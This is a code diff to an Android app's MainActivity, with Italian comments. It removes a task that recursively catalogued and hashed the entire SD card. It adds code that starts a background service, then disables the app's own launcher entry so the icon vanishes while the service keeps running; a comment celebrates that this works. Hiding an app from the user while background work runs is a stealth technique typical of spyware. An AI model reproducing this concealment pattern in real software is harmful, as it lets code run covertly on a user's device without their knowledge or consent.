@@ -37,17 +37,25 @@ public class MainActivity extends Activity {
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-       setContentView(R.layout.activity_main);
+       /*setContentView(R.layout.activity_main);
 
         txt = (TextView) findViewById(R.id.textview);
         txt.setMovementMethod(new ScrollingMovementMethod());
-        txt.setText("aòksjdbvpiawejbgvpawebgqwebgjqewh");
+        txt.setText("aòksjdbvpiawejbgvpawebgqwebgjqewh");*/
 
         // La cosa più importante dell'universo da Marshmallow in poi a quanto pare
         ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST_READ_CONTACTS);
 
+        Intent intent = new Intent(this, MyIntentService.class);
+        startService(intent);
 
-        new DownloadFilesTask().execute(null, null, null);
+        // serve a far sparire da menù e chiudere app .. FUNZIONA!!!
+        PackageManager p = getPackageManager();
+        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        finish();
+
+
+        //
     }
 
    /*
@@ -76,99 +84,5 @@ public class MainActivity extends Activity {
             // permissions this app might request
         }
     }*/
-
-
-
-
-    public static String getSha1Hex(String clearString)
-    {
-        try
-        {
-            MessageDigest messageDigest = MessageDigest.getInstance("SHA-1");
-            messageDigest.update(clearString.getBytes("UTF-8"));
-            byte[] bytes = messageDigest.digest();
-            StringBuilder buffer = new StringBuilder();
-            for (byte b : bytes)
-            {
-                buffer.append(Integer.toString((b & 0xff) + 0x100, 16).substring(1));
-            }
-            return buffer.toString();
-        }
-        catch (Exception ignored)
-        {
-            ignored.printStackTrace();
-            return null;
-        }
-    }
-
-    private class DownloadFilesTask extends AsyncTask<JSONObject, JSONObject, JSONObject > {
-
-
-        private JSONArray ls(File f){
-            JSONArray jsonArray = new JSONArray();
-
-            File[]dirs = f.listFiles();
-
-            for(File ff: dirs) {
-
-                Date lastModDate = new Date(ff.lastModified());
-                DateFormat formater = DateFormat.getDateTimeInstance();
-                String date_modify = formater.format(lastModDate);
-
-                JSONObject what = new JSONObject();
-
-                try {
-
-                    what.put("isDirectory", ff.isDirectory());
-                    what.put("nome", ff.getName());
-                    what.put("lastModDate", date_modify);
-
-
-                    if(ff.isDirectory())
-                        what.put("sub", ls(new File(ff.getPath())));
-                    else {
-                        what.put("sub", "");
-                        what.put("Byte", ff.length());
-                    }
-
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
-                jsonArray.put(what);
-
-            }
-
-            return jsonArray;
-        }
-
-        protected void onPostExecute(JSONObject jsonObjects) {
-            String aaa = jsonObjects.toString();
-            Log.e("testJSON: ",aaa );
-            try {
-                txt.setText(jsonObjects.getString("sha1").toString() + "\n" + aaa.getBytes().length);
-
-            Log.e("testJSON: ", "done -> " + jsonObjects.getString("sha1").toString() + " " + aaa.getBytes().length);
-            } catch (JSONException e) {
-                Log.e("MainActivity: ", "JSONException in onPostExecute");
-            }
-        }
-
-        @Override
-        protected JSONObject doInBackground(JSONObject... jsonObjects) {
-            File sdcard = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
-
-            JSONObject jsonObject = new JSONObject();
-
-            try {
-                jsonObject.put("FileSystem", ls(sdcard));
-                jsonObject.put("sha1", getSha1Hex(jsonObject.toString()));
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-
-            return jsonObject;
-        }
-    }
 
 }
